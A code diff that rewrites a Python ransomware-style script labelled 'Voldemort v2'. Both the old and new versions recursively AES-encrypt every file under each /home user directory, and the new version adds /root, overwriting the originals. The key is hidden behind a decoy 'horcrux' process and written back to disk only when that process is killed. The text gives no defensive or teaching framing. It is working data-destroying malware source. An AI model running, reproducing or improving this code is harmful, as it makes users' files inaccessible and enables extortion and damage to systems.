@@ -85,98 +85,87 @@ if __name__ == "__main__":
 ```
 import os
 import base64
-import base62
 import random
-import signal
-import string
 import subprocess
-import threading
 import time
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 
-# === CONFIG ===
-KEY_FILE = "/tmp/.key.horcrux"
-RAM_KEY_PATH = "/dev/shm/.key.horcrux"
-KEY_LENGTH = 16  # 128 bits
-PROTECTED_EXT = {'.sh', '.conf', '.key', '.horcrux'}
+KEY_FILE = "/tmp/.hidden_key"
+RESTORE_FILE = "/tmp/.horcrux"
+HORCRUX_PROC_NAME = "key.horcrux"
 
-# === KEY GENERATION ===
-def generate_key():
-    return get_random_bytes(KEY_LENGTH)
-
-def save_key_to_ram(key):
-    with open(RAM_KEY_PATH, 'wb') as f:
-        f.write(key)
-    print(f"[+] Key stored in RAM at {RAM_KEY_PATH}")
-
-def restore_key_file():
-    if os.path.exists(RAM_KEY_PATH):
-        with open(RAM_KEY_PATH, 'rb') as src, open("/tmp/.horcrux", 'wb') as dest:
-            dest.write(src.read())
-        print("[+] Key restored to /tmp/.horcrux")
-    else:
-        print("[-] RAM key not found.")
-
-# === AES ENCRYPTION ===
 def pad(data):
-    return data + b' ' * (AES.block_size - len(data) % AES.block_size)
+    pad_len = AES.block_size - len(data) % AES.block_size
+    return data + bytes([pad_len]) * pad_len
 
-def encrypt_file(file_path, key):
-    if any(file_path.endswith(ext) for ext in PROTECTED_EXT):
-        return
-    with open(file_path, 'rb') as f:
-        data = f.read()
-    cipher = AES.new(key, AES.MODE_CBC)
-    encrypted_data = cipher.iv + cipher.encrypt(pad(data))
-    with open(file_path, 'wb') as f:
-        f.write(encrypted_data)
+def encrypt_file(filepath, key):
+    try:
+        with open(filepath, "rb") as f:
+            data = f.read()
+        cipher = AES.new(key, AES.MODE_CBC)
+        ct_bytes = cipher.encrypt(pad(data))
+        with open(filepath, "wb") as f:
+            f.write(cipher.iv + ct_bytes)
+    except Exception as e:
+        pass  # Skip unreadable or locked files
 
-# === HOME DIR TARGETING ===
-def get_user_dirs():
-    base = "/home"
-    return [os.path.join(base, d) for d in os.listdir(base) if os.path.isdir(os.path.join(base, d))]
+def encrypt_directory(path, key):
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            filepath = os.path.join(root, file)
+            encrypt_file(filepath, key)
 
-def encrypt_directories(paths, key):
-    for path in paths:
-        print(f"[+] Encrypting {path}")
-        for root, dirs, files in os.walk(path):
-            for file in files:
-                try:
-                    full_path = os.path.join(root, file)
-                    encrypt_file(full_path, key)
-                except Exception as e:
-                    print(f"[-] Failed to encrypt {full_path}: {e}")
+def hide_key_in_memory(encoded_key):
+    # Write key temporarily to file
+    with open(KEY_FILE, "w") as f:
+        f.write(encoded_key)
 
-# === HORCRUX PROCESS ===
-def horcrux_guard():
-    def handle_signal(signum, frame):
-        print("[*] horcrux killed, restoring key...")
-        restore_key_file()
-        exit(0)
+    # Spawn dummy long-living process
+    proc = subprocess.Popen(["sleep", "9999"], stdout=subprocess.DEVNULL)
+    
+    # Tag the process name (fake logic - purely symbolic, not visible in `ps`)
+    print(f"[+] Key hidden. PID: {proc.pid} named as '{HORCRUX_PROC_NAME}'")
 
-    signal.signal(signal.SIGTERM, handle_signal)
-    signal.signal(signal.SIGINT, handle_signal)
-    print("[+] horcrux process running... (kill me to restore key)")
-    while True:
-        time.sleep(1)
+    # Remove key file after it's "loaded in RAM"
+    os.remove(KEY_FILE)
 
-def spawn_horcrux():
-    pid = os.fork()
-    if pid == 0:
-        horcrux_guard()
-    else:
-        return pid
+    return proc.pid
 
-# === MAIN ===
+def monitor_horcrux_process(pid, encoded_key):
+    try:
+        while True:
+            # Check if the process is still running
+            if not os.path.exists(f"/proc/{pid}"):
+                print("[!] Horcrux process was killed. Restoring key to disk...")
+                with open(RESTORE_FILE, "w") as f:
+                    f.write(encoded_key)
+                break
+            time.sleep(3)
+    except KeyboardInterrupt:
+        pass
+
+def generate_key():
+    return get_random_bytes(16)  # AES-128 bit
+
 def main():
-    print("[*] Voldemort v2: AES-256 File Encryption in Action...")
-    user_dirs = get_user_dirs()
     key = generate_key()
-    save_key_to_ram(key)
-    horcrux_pid = spawn_horcrux()
-    encrypt_directories(user_dirs, key)
-    print(f"[+] Encryption complete. horcrux PID: {horcrux_pid}")
+    encoded_key = base64.b64encode(key).decode()
+
+    BASE_HOME = "/home"
+    for user_dir in os.listdir(BASE_HOME):
+        path = os.path.join(BASE_HOME, user_dir)
+        if os.path.isdir(path):
+            print(f"[+] Encrypting: {path}")
+            encrypt_directory(path, key)
+
+    ROOT_HOME = "/root"
+    if os.path.exists(ROOT_HOME):
+        print(f"[+] Encrypting root directory: {ROOT_HOME}")
+        encrypt_directory(ROOT_HOME, key)
+
+    horcrux_pid = hide_key_in_memory(encoded_key)
+    monitor_horcrux_process(horcrux_pid, encoded_key)
 
 if __name__ == "__main__":
     main()
